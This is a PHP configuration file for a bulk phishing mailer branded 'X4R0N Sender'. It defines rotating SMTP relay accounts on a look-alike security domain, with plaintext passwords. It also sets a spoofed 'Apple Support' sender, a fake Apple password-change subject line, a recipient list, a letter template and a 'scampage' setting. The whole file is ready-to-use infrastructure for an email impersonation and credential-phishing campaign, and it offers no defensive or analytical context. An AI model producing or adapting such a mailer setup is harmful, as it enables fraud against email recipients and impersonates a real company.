<?php

//Regards
date_default_timezone_set('Asia/Jakarta');
$date = date('F d, Y, h:i A T');

/* SMTP SETUP */
$smtp_acc = [
    [
        "host"     => "smtp-relay.gmail.com",
        "port"     => "587",
        "username" => "no-reply@mail-security-help.com",
        "password" => "jancuk123"
    ],
    [
        "host"     => "smtp-relay.gmail.com",
        "port"     => "587",
        "username" => "no-replly@mail-security-help.com",
        "password" => "jancuk123"
    ],
    [
        "host"     => "smtp-relay.gmail.com",
        "port"     => "587",
        "username" => "no-repply@mail-security-help.com",
        "password" => "jancuk123"
    ],

];

/* Features SETUP */

$gx_setup = [
    "priority"       => 1,
    "userandom"      => 0,
    "sleeptime"      => 5,
    "replacement"    => 1,
    "filesend"       => 1,
    "userremoveline" => 0,
    "mail_list"      => "file/maillist/list.txt",
    "fromname"       => "Apple Support",
    "frommail"       => "##randstring##-Apple-service-##randstring##-mail-support-no-reply@statement-verify-id.com",
    "subject"        => "Re: [ New Statement ] Confirmation change password of your Apple account in Google Chrome ( 18 May 2018 ).",
    "msgfile"        => "file/letter/letter.html",
    "filepdf"        => "file/attachment/logo.ico",
    "scampage"       => ["https://www.google.com"],
];
// X4R0N Sender By ARON-TN

/*
X4R0N Sender By ARON-TN
FB: WWW.FACEBOOK.COM/AMIR.OTHMAN.OFFICIAL
KILLER MAIL !
=======================================================================
  :::.    :::::::..       ...   :::.    :::. :::::::::::::::.    :::.
  ;;`;;   ;;;;``;;;;   .;;;;;;;.`;;;;,  `;;; ;;;;;;;;''''`;;;;,  `;;;
 ,[[ '[[,  [[[,/[[['  ,[[     \[[,[[[[[. '[[      [[       [[[[[. '[[
c$$$cc$$$c $$$$$$c    $$$,     $$$$$$ "Y$c$$ cccc $$       $$$ "Y$c$$
 888   888,888b "88bo,"888,_ _,88P888    Y88      88,      888    Y88
 YMM   ""` MMMM   "W"   "YMMMMMP" MMM     YM      MMM      MMM     YM
=======================================================================

*/